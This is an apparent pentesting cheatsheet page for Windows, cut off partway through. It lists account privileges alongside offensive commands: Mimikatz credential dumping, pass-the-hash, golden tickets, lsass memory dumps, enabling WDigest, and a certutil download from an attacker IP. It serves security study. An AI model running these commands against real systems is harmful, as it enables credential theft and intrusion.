          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SMB-Samba-NetBIOS-135-139,445/" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link">
      SMB Samba NetBIOS 135 139,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SMTP-25/" title="SMTP 25" class="md-nav__link">
      SMTP 25
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SNMP-161/" title="SNMP 161" class="md-nav__link">
      SNMP 161
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SQL-Server-1433,1434/" title="SQL Server 1433,1434" class="md-nav__link">
      SQL Server 1433,1434
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SSH-22/" title="SSH 22" class="md-nav__link">
      SSH 22
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SquidProxy-3128/" title="SquidProxy 3128" class="md-nav__link">
      SquidProxy 3128
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/TFTP-69/" title="TFTP 69" class="md-nav__link">
      TFTP 69
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Telnet-23/" title="Telnet 23" class="md-nav__link">
      Telnet 23
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Tor-9001,9030/" title="Tor 9001,9030" class="md-nav__link">
      Tor 9001,9030
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/VNC-5900/" title="VNC 5900" class="md-nav__link">
      VNC 5900
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/WebDev/" title="WebDev" class="md-nav__link">
      WebDev
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/WinRM-5985,5986/" title="WinRM 5985,5986" class="md-nav__link">
      WinRM 5985,5986
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/X11-6000/" title="X11 6000" class="md-nav__link">
      X11 6000
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/rlogin-513/" title="Rlogin 513" class="md-nav__link">
      Rlogin 513
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#versions" class="md-nav__link">
    Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-accounts" class="md-nav__link">
    User accounts
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#open-password-protected-share" class="md-nav__link">
    Open password protected share
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#convert-string-to-little-endian" class="md-nav__link">
    Convert string to little-endian
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#recon" class="md-nav__link">
    Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-network-recon" class="md-nav__link">
    Domain Network Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#moving-files" class="md-nav__link">
    Moving files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#extract-zip" class="md-nav__link">
    Extract ZIP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#view-file-systems" class="md-nav__link">
    View File Systems
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-shared-volume" class="md-nav__link">
    Access shared volume
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#invoke-command-with-credentials" class="md-nav__link">
    Invoke command with credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alternate-data-stream" class="md-nav__link">
    Alternate Data Stream
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msi" class="md-nav__link">
    MSI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installing-msi" class="md-nav__link">
    Installing MSI
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#services" class="md-nav__link">
    Services
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#auto-sc-config-servicename-start-auto" class="md-nav__link">
    Auto: sc config servicename start= auto
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#keep-alive" class="md-nav__link">
    Keep alive
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#auto-save-password-to-powershell" class="md-nav__link">
    Auto Save Password to PowerShell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#permissions" class="md-nav__link">
    Permissions
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#view-permisions" class="md-nav__link">
    View Permisions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grant-permissions" class="md-nav__link">
    Grant Permissions
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh-from-windows-to-attacker-kali" class="md-nav__link">
    SSH from Windows to Attacker (Kali)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual" class="md-nav__link">
    Manual
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration-tips" class="md-nav__link">
    Enumeration Tips
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#add-user-and-enable-rdp" class="md-nav__link">
    Add user and enable RDP
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="cheatsheet">Cheatsheet<a class="headerlink" href="#cheatsheet" title="Permanent link">&para;</a></h1>
<p>Commands &amp; prevesc: <a href="https://guif.re/windowseop">https://guif.re/windowseop</a>
VMs: <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
<h2 id="versions">Versions<a class="headerlink" href="#versions" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="nv">Windows</span> <span class="mi">1</span>.<span class="mi">0</span>                    <span class="mi">1</span>.<span class="mi">04</span>
<span class="nv">Windows</span> <span class="mi">2</span>.<span class="mi">0</span>                    <span class="mi">2</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="mi">3</span>.<span class="mi">0</span>                    <span class="mi">3</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="mi">3</span>.<span class="mi">1</span>                 <span class="mi">3</span>.<span class="mi">10</span>.<span class="mi">528</span>
<span class="nv">Windows</span> <span class="k">for</span> <span class="nv">Workgroups</span> <span class="mi">3</span>.<span class="mi">11</span>    <span class="mi">3</span>.<span class="mi">11</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">5</span>     <span class="mi">3</span>.<span class="mi">5</span>.<span class="mi">807</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">3</span>.<span class="mi">51</span>    <span class="mi">3</span>.<span class="mi">51</span>.<span class="mi">1057</span>
<span class="nv">Windows</span> <span class="mi">95</span>                     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">950</span>
<span class="nv">Windows</span> <span class="nv">NT</span> <span class="nv">Workstation</span> <span class="mi">4</span>.<span class="mi">0</span>     <span class="mi">4</span>.<span class="mi">0</span>.<span class="mi">1381</span>
<span class="nv">Windows</span> <span class="mi">98</span>                     <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">1998</span>
<span class="nv">Windows</span> <span class="mi">98</span> <span class="nv">Second</span> <span class="nv">Edition</span>      <span class="mi">4</span>.<span class="mi">1</span>.<span class="mi">2222</span>
<span class="nv">Windows</span> <span class="nv">Me</span>                     <span class="mi">4</span>.<span class="mi">90</span>.<span class="mi">3000</span>
<span class="nv">Windows</span> <span class="mi">2000</span> <span class="nv">Professional</span>      <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">2195</span>
<span class="nv">Windows</span> <span class="nv">XP</span>                     <span class="mi">5</span>.<span class="mi">1</span>.<span class="mi">2600</span>
<span class="nv">Windows</span> <span class="nv">Vista</span>                  <span class="mi">6</span>.<span class="mi">0</span>.<span class="mi">6000</span>
<span class="nv">Windows</span> <span class="mi">7</span>                      <span class="mi">6</span>.<span class="mi">1</span>.<span class="mi">7600</span>
<span class="nv">Windows</span> <span class="mi">8</span>.<span class="mi">1</span>                    <span class="mi">6</span>.<span class="mi">3</span>.<span class="mi">9600</span>
<span class="nv">Windows</span> <span class="mi">10</span>                     <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">10240</span>
</pre></div>

<h2 id="user-accounts">User accounts<a class="headerlink" href="#user-accounts" title="Permanent link">&para;</a></h2>
<ul>
<li>LocalSystem account is a predefined local account used by the service control manager. <ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx</a></li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has extensive privileges on the local computer, and acts as the computer on the network. </li>
<li>Its token includes the <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">SYSTEM</span></code> and <code class="codehilite"><span class="n">BUILTIN</span><span class="err">\</span><span class="n">Administrators</span></code> SIDs; these accounts have access to most system objects. </li>
<li>The name of the account in all locales is <code class="codehilite"><span class="p">.</span><span class="err">\</span><span class="n">LocalSystem</span></code>. </li>
<li>The name, <code class="codehilite"><span class="n">LocalSystem</span></code> or <code class="codehilite"><span class="n">ComputerName</span><span class="err">\</span><span class="n">LocalSystem</span></code> can also be used. </li>
<li>This account does not have a password. </li>
<li>If you specify the <code class="codehilite"><span class="n">LocalSystem</span></code> account in a call to the <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> function, any password information you provide is ignored.</li>
<li>The service can open the registry key HKEY_LOCAL_MACHINE\SECURITY.</li>
<li>The service presents the computer's credentials to remote servers.</li>
<li>If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">LocalSystem</span></code> account inherits the security context of the SCM. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_LOCAL_SYSTEM_RID</span></code> value. </li>
<li>Has:<ul>
<li>E_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (enabled)</li>
<li>SE_BACKUP_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_CREATE_PAGEFILE_NAME (enabled)</li>
<li>SE_CREATE_PERMANENT_NAME (enabled)</li>
<li>SE_CREATE_TOKEN_NAME (disabled)</li>
<li>SE_DEBUG_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INC_BASE_PRIORITY_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_LOAD_DRIVER_NAME (disabled)</li>
<li>SE_LOCK_MEMORY_NAME (enabled)</li>
<li>SE_MANAGE_VOLUME_NAME (disabled)</li>
<li>SE_PROF_SINGLE_PROCESS_NAME (enabled)</li>
<li>SE_RESTORE_NAME (disabled)</li>
<li>SE_SECURITY_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_SYSTEM_ENVIRONMENT_NAME (disabled)</li>
<li>SE_SYSTEMTIME_NAME (disabled)</li>
<li>SE_TAKE_OWNERSHIP_NAME (disabled)</li>
<li>SE_TCB_NAME (enabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
</ul>
</li>
</ul>
</li>
<li>LocalService account is a predefined local account used by the service control manager.<ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx</a></li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and presents anonymous credentials on the network.</li>
<li>Can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">LocalService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the LocalService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
<li>NetworkService account is a predefined local account used by the service control manager. <ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx</a></li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and acts as the computer on the network.</li>
<li>This account can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NetworkService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">NetworkService</span></code> account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_NETWORK_SERVICE_RID</span></code> value.</li>
<li>Has its own subkey under the <code class="codehilite"><span class="n">HKEY_USERS</span></code> registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the NetworkService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">privilege</span><span class="o">::</span><span class="n">debug</span>

<span class="n">sekurlsa</span><span class="o">::</span><span class="n">logonPasswords</span> <span class="n">full</span>
<span class="n">sekurlsa</span><span class="o">::</span><span class="n">pth</span> <span class="o">/</span><span class="nl">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:</span><span class="n">WOSHUB</span> <span class="o">/</span><span class="nl">ntlm</span><span class="p">:{</span><span class="n">NTLM_hash</span><span class="p">}</span> <span class="o">/</span><span class="nl">run</span><span class="p">:</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>

<span class="n">misc</span><span class="o">::</span><span class="n">skeleton</span>

<span class="n">ipconfig</span> <span class="o">/</span><span class="n">all</span>
<span class="n">whoami</span> <span class="o">/</span><span class="n">user</span>
<span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="nl">name</span><span class="p">:</span><span class="n">krbtgt</span>
<span class="n">kerbros</span><span class="o">::</span><span class="n">golden</span> <span class="o">/</span><span class="nl">domain</span><span class="p">:[</span><span class="n">Domain</span><span class="p">]</span> <span class="o">/</span><span class="nl">sid</span><span class="p">:[</span><span class="n">SID</span><span class="p">]</span> <span class="o">/</span><span class="nl">rc4</span><span class="p">:[</span><span class="n">NTLM</span> <span class="n">Hash</span><span class="p">]</span> <span class="o">/</span><span class="nl">user</span><span class="p">:[</span><span class="n">Username</span> <span class="n">To</span> <span class="n">Create</span><span class="p">]</span> <span class="o">/</span><span class="kt">id</span><span class="o">:</span><span class="mi">500</span> <span class="o">/</span><span class="n">ptt</span>
<span class="n">pushd</span> <span class="err">\\</span><span class="n">WINSERVER01</span><span class="err">\</span><span class="n">c</span><span class="err">$</span>
<span class="n">cd</span> <span class="n">WINDOWS</span><span class="err">\</span><span class="n">NTDS</span>
</pre></div>

<p>If WDigest is disabled:
<div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="k">add</span> <span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Control</span><span class="err">\</span><span class="n">SecurityProviders</span><span class="err">\</span><span class="n">WDigest</span> <span class="o">/</span><span class="n">v</span> <span class="n">UseLogonCredential</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">1</span>
</pre></div></p>
<p>Export memory dump and use it in Mimikatz:
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Process</span> <span class="n">lsass</span> <span class="o">|</span> <span class="k">Out</span><span class="o">-</span><span class="n">Minidump</span>
<span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">lsass_592</span><span class="p">.</span><span class="n">dmp</span>
</pre></div></p>
<p>Using VMWare / Hibernate file: <a href="http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/">http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/</a>
Mimikatz features: <a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></p>
<h2 id="psexec">PsExec<a class="headerlink" href="#psexec" title="Permanent link">&para;</a></h2>
<p><a href="https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec">https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec</a>
<a href="https://www.toshellandback.com/2017/02/11/psexec/">https://www.toshellandback.com/2017/02/11/psexec/</a>
<a href="http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html">http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html</a></p>
<h2 id="open-password-protected-share">Open password protected share<a class="headerlink" href="#open-password-protected-share" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="err">\\</span><span class="n">server</span><span class="err">\</span><span class="k">share</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">test</span> <span class="n">testpassword</span>
<span class="k">start</span> <span class="err">\\</span><span class="n">server</span><span class="err">\</span><span class="k">share</span>
</pre></div>

<h2 id="convert-string-to-little-endian">Convert string to little-endian<a class="headerlink" href="#convert-string-to-little-endian" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">iconv</span> <span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">code</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="n">LE</span>
</pre></div>

<blockquote>
<p>Should be done before base64 encoding for -ExecuteCommand in powershell</p>
</blockquote>
<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
<ul>
<li>IP, subnet, default gateway etc: <code class="codehilite"><span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span></code></li>
</ul>
<ul>
<li>Current user name, info in current access token, SID, privs and group that current user belongs to: <code class="codehilite"><span class="n">whoami</span> <span class="o">/</span><span class="k">all</span></code></li>
</ul>
<ul>
<li>Local groups on current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span></code></li>
</ul>
<ul>
<li>Local administrators of current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span> <span class="ss">&quot;administrators&quot;</span></code></li>
</ul>
<ul>
<li>Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span></code></li>
<li>Running processes with verbose mode: <code class="codehilite"><span class="n">tasklist</span> <span class="o">/</span><span class="n">V</span></code></li>
<li>Startup programs: <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Windows services with binary paths: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="o">&lt;</span><span class="n">service</span><span class="o">&gt;</span></code></li>
<li>OS, processor, memory, bios related info: <code class="codehilite"><span class="n">systeminfo</span><span class="o">&gt;</span><span class="k">output</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Scheduled jobs: <code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="o">/</span><span class="n">v</span></code></li>
<li>Patches installed and figuring out if its missing important any patch: <code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span></code></li>
</ul>
<h2 id="domain-network-recon">Domain Network Recon<a class="headerlink" href="#domain-network-recon" title="Permanent link">&para;</a></h2>
<ul>
<li>Mapping of IP address to its MAC address in the network: <code class="codehilite"><span class="n">arp</span> <span class="o">-</span><span class="n">a</span></code></li>
<li>Domain: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">USERDOMAIN</span><span class="o">%</span></code></li>
<li>Domain controller name: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">logonserver</span><span class="o">%</span></code></li>
<li>List of domain users: <code class="codehilite"><span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>List of groups in the domain: <code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>AD domain password policy: <code class="codehilite"><span class="n">net</span> <span class="n">accounts</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>Map AD trust relationships: <code class="codehilite"><span class="n">nltest</span> <span class="o">/</span><span class="n">domain_trusts</span></code></li>
</ul>
<h2 id="moving-files">Moving files<a class="headerlink" href="#moving-files" title="Permanent link">&para;</a></h2>
<blockquote>
<ul>
<li>Ref: <a href="http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html">http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html</a></li>
</ul>
</blockquote>
<div class="codehilite"><pre><span></span><span class="n">certutil</span> <span class="o">-</span><span class="n">verifyctl</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="err">​</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">8</span><span class="o">/</span><span class="n">taskkill</span><span class="p">.</span><span class="n">exe</span>
<span class="n">mv</span> <span class="o">*</span><span class="p">.</span><span class="n">bin</span> <span class="n">taskkill</span><span class="p">.</span><span class="n">exe</span>
</pre></div>

<h2 id="extract-zip">Extract ZIP<a class="headerlink" href="#extract-zip" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">assembly</span>
<span class="s1">&#39;system.io.compression.filesystem&#39;</span><span class="p">;[</span><span class="n">io</span><span class="p">.</span><span class="n">compression</span><span class="p">.</span><span class="n">zipfile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span>
<span class="p">(</span><span class="ss">&quot;C:\backup.zip&quot;</span><span class="p">,</span><span class="ss">&quot;C:\Example\&quot;</span><span class="p">)</span>
</pre></div>

<h2 id="view-file-systems">View File Systems<a class="headerlink" href="#view-file-systems" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">gdr</span> <span class="o">-</span><span class="n">PSProvider</span> <span class="s1">&#39;FileSystem&#39;</span>
</pre></div>

<h2 id="access-shared-volume">Access shared volume<a class="headerlink" href="#access-shared-volume" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="n">y</span><span class="p">:</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">57</span><span class="err">\</span><span class="k">c</span><span class="err">$</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">administrator</span> <span class="mi">1234</span><span class="n">test</span>
</pre></div>

<h2 id="invoke-command-with-credentials">Invoke command with credentials<a class="headerlink" href="#invoke-command-with-credentials" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="err">$</span><span class="k">user</span> <span class="o">=</span> <span class="s1">&#39;.\administrator&#39;</span><span class="p">;</span>
<span class="err">$</span><span class="n">psw</span> <span class="o">=</span> <span class="s1">&#39;1234test&#39;</span><span class="p">;</span>
<span class="err">$</span><span class="n">secpsw</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="err">$</span><span class="n">psw</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="k">Force</span><span class="p">;</span>
<span class="err">$</span><span class="n">credential</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="err">$</span><span class="k">user</span><span class="p">,</span> <span class="err">$</span><span class="n">secpsw</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nt">invoke-command</span> <span class="nt">-computername</span> <span class="nt">localhost</span> <span class="nt">-credential</span> <span class="o">$</span><span class="nt">credential</span>
<span class="nt">-scriptblock</span> <span class="p">{</span><span class="err">cd</span> <span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="p">;</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="o">.</span><span class="n">exe</span><span class="p">}</span>
</pre></div>

<h2 id="alternate-data-stream">Alternate Data Stream<a class="headerlink" href="#alternate-data-stream" title="Permanent link">&para;</a></h2>
<ul>
<li>Listing: <code class="codehilite"><span class="n">dir</span> <span class="o">/</span><span class="n">R</span></code></li>
<li>Find Streams: <code class="codehilite"><span class="err">​</span><span class="k">get</span><span class="o">-</span><span class="n">item</span> <span class="o">-</span><span class="n">path</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="o">-</span><span class="n">stream</span> <span class="o">*</span></code></li>
